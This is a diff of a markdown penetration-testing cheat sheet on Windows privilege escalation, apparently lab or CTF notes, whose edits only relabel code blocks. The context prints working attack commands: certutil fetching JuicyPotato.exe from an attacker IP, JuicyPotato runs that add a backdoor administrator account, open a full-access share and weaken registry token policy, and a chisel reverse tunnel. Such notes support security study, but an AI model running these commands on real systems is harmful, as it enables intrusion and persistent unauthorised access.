@@ -27,25 +27,25 @@ can create those tickets
 
 1. check systeminfo documentation
 
-    ```
+    ```bash
     python3 windows-exploit-suggester.py -i systeminfo.txt -d 2021-07-14-mssb.xlsx
     ```
 
 1. github.SecWiki/windows-kernel-exploits
 
-1. python -m http.server
+1. `python -m http.server`
 
-1. certutil.exe -f
+1. `certutil.exe -f`
 
 ## Check command history {-}
 
-```bash
+```powershell
 dir/s *history.txt
 ```
 
 ## Check local open ports {-}
 
-```bash
+```powershell
 netstat -nat
 ```
 
@@ -57,7 +57,7 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
 
 1. Check user privilege
 
-    ```bash
+    ```powershell
     whoami
     whoami /priv
     ```
@@ -70,7 +70,7 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
 
 1. Check users in the system
 
-    ```bash
+    ```powershell
     net user
     ```
 
@@ -80,31 +80,31 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
     - create folder in `C:\Windows\Temp`
     - Transfer JuicyPotato to Windows Machine
     
-        ```bash
+        ```powershell
         certutil.exe -f -urlcache -split http://10.10.10.10/JuicyPotato.exe JP.exe
         ```
     - Create user looping
 
-        ```bash
+        ```powershell
         JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net user looping looping123! /add"
         ```
 
     - Add user to Administrators group
 
-        ```bash
+        ```powershell
         JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net localgroup Administrators looping /add"
         net user looping
         ```
 
     - Create Share folder where user with Administrators rules have Full privilege
 
-        ```bash
+        ```powershell
         JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c net share attacker_folder=C:\Windows\Temp /GRANT:Administrators,FULL"
         ```
     
     - Update local account policy to gain access to the system
 
-        ```bash
+        ```powershell
         JP.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System 
                                                                     /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f"
         ```
@@ -120,7 +120,7 @@ Juicy Potato is a local privilege escalation tool that exploit Windows service a
 
         - run chisel on windows victim machine
 
-            ```bash
+            ```powershell
             chisel.exe client 10.10.10.10:1234 R:445:127.0.0.1:445
             ```
         - check if revert port forwarding works
@@ -180,6 +180,3 @@ Payloads for Windows and Active Directory are listed in the [Methodology and Res
 where you can find a **Windows - Privilege Escalation.md**.
 
 Search for UsoSvc to find what to do.
-
-
-
